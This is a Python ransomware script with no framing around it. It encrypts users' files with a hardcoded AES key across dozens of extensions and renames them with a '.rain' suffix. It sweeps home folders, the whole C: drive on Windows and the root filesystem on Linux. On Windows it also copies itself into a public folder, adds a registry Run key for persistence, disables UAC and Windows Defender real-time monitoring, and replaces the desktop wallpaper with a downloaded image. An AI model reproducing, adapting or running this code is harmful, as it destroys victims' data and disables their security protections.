try:
	import requests
except:
	pass
try:
	import os
	import shutil
	from os import getenv,system
	from Crypto.Cipher import AES
	import glob
	import platform
	from shutil import copyfile
except Exception as e:
	print(e)
	exit()

def crypt(file):
	file_crypto = open(file,'rb')
	file_crypto = file_crypto.read()
	correct = file_crypto+b'#'*(16-len(file_crypto)%16)
	cifdata = aes.encrypt(correct)
	cifile = open(file,'wb')
	cifile.write(cifdata)
	cifile.close()
	os.rename(file,file+'.rain')

k='u7x!A%D*G-KaPdSgVkYp3s5v8y/B?E(H'
aes = AES.new(k, AES.MODE_ECB)
ext=['*.txt','*.lnk','*.application','*.veg','*.doc','*.pdf','*.jpg','*.gif','*.png','*.bitmap'
,'*.mp4','*.avi','*.zip','*.wav','*.svg','*.mdb','*.rar','*.tar','*.xf','*.gz'
,'*.sqlite3','*.mov','*.pptx','*.pptm','*.xlsx','*.xlsm','*.aes','*.accdb','*.bmp'
,'*.mpeg','*.sql','*.sqlitedb','*.jar','*.java','*.cdr','*.vssettings','*.vbs','*.vssx'
,'*.cpp','*.c','*.NET','*.rb','*.sh','*.appref-ms','*.html','*.css','*.sublime-package'
,'*.bz2','*.iso','*.img','*.sfk','*.mkv','*.psd','*.xz','*.7z','*.gz','*.mid','*.wmv','*.mov'
,'*.cdr','*.ai','*.tif','*.fla','*.swf','*.dwg','*.mpg','*.xls','*.docx','*.rtf','*.pps','*.ppt'
,'*.pptx','*.ppsx','*.ico','*.3gp','*.dxf','*.eps','*.max','*.nrg','*.ogg','*.pic','*.php','*.qxd'
,'*.rm','*.swf','*.vob','*.wri','*.vbs','*.chc','*.real','*.list','*.desktop','*.so','*.json','*.new']

sys = platform.system()
if sys=='Windows':
	try:
		shutil.copy('sik.py','C:/Users/Public/')
		bat = open('C:/Users/Public/prst.bat','w')
		bat.write('reg.exe add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v "tskname" /t REG_SZ /d "C:\\Users\\Public\\sik.py" /f')
		bat.close()
		os.startfile('C:/Users/Public/prst.bat')

		bat2 = open('C:/Users/Public/uac.bat','w')
		bat2.write('reg.exe add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f')
		bat2.close()
		os.startfile('C:/Users/Public/uac.bat')


		bat3 = open('C:/Users/Public/wd.bat','w')
		bat3.write('Set-MpPreference -DisableRealtimeMonitoring $ true')
		bat3.close()
		os.startfile('C:/Users/Public/wd.bat')

		desktop = os.path.expanduser('~/Desktop')
		documents = os.path.expanduser('~/Documents')
		downloads = os.path.expanduser('~/Downloads')
		appdt = getenv('APPDATA')
	except:
		pass
	os.chdir(desktop)
	for i in ext:
		try:
			files = glob.iglob(desktop+'/**/'+(i),recursive=True)
		except:
			pass
		for file in files:
			try:
				crypt(file)
			except:
				pass

	os.chdir(documents)
	for i in ext:
		try:
			files = glob.iglob(documents+'/**/'+(i),recursive=True)
		except:
			pass
		for file in files:
			try:
				crypt(file)
			except:
				pass

	os.chdir(downloads)
	for i in ext:
		try:
			files = glob.iglob(downloads+'/**/'+(i),recursive=True)
		except:
			pass
		for file in files:
			try:
				crypt(file)
			except:
				pass

	url='https://i.redd.it/owhz3xmb7a311.jpg'
	try:
		try:
			r = requests.get(url)
		except:
			pass
		img = open('C:/Users/Public/rimg.jpg','wb')
		img.write(r.content)
		img.close()
		img = 'C:/Users/Public/rimg.jpg'
		dst = appdt+'/Microsoft/Windows/Themes/'
		os.chdir(dst)
		copyfile('TranscodedWallpaper','C:/Users/Public/transold')
		copyfile(img,dst+'TranscodedWallpaper')
		system('taskkill /f /im explorer.exe')
		system('C:\\Windows\\explorer.exe')
	except:
		pass

	for i in ext:
		try:
			files = glob.iglob('C:/**/'+(i),recursive=True)
		except:
			pass
		for file in files:
			try:
				crypt(file)
			except:
				pass
elif sys=='Linux':
	desktop = os.path.expanduser('~/Desktop')
	area = os.path.expanduser('~/Área de trabalho')
	documents = os.path.expanduser('~/Documents')
	documentos = os.path.expanduser('~/Documentos')
	downloads = os.path.expanduser('~/Downloads')
	root = os.path.expanduser('/')
	
	try:
		shutil.copy('sik.py',documents)
		shutil.copy('sik.py',documentos)
		shutil.copy('sik.py',root)
	except:
		pass

	
	try:
		os.chdir(desktop)
	except:
		os.chdir(area)
		for i in ext:
			try:
				files = glob.iglob(area+'/**/'+(i),recursive=True)
			except:
				pass
			for file in files:
				try:
					crypt(file)
				except:
					pass
	for i in ext:
		try:
			files = glob.iglob(desktop+'/**/'+(i),recursive=True)
		except:
			pass
		for file in files:
			try:
				crypt(file)
			except:
				pass
	try:
		os.chdir(documents)
	except:
		os.chdir(documentos)
		for i in ext:
			try:
				files = glob.iglob(documentos+'/**/'+(i),recursive=True)
			except:
				pass
			for file in files:
				try:
					crypt(file)
				except:
					pass

	for i in ext:
			try:
				files = glob.iglob(documents+'/**/'+(i),recursive=True)
			except:
				pass
			for file in files:
				try:
					crypt(file)
				except:
					pass

	os.chdir(downloads)
	for i in ext:
		try:
			files = glob.iglob(downloads+'/**/'+(i),recursive=True)
		except:
			pass
		for file in files:
			try:
				crypt(file)
			except:
				pass
	os.chdir(root)
	for i in ext:
		try:
			files = glob.iglob(root+'/**/'+(i),recursive=True)
		except:
			pass
		for file in files:
			try:
				crypt(file)
			except:
				pass


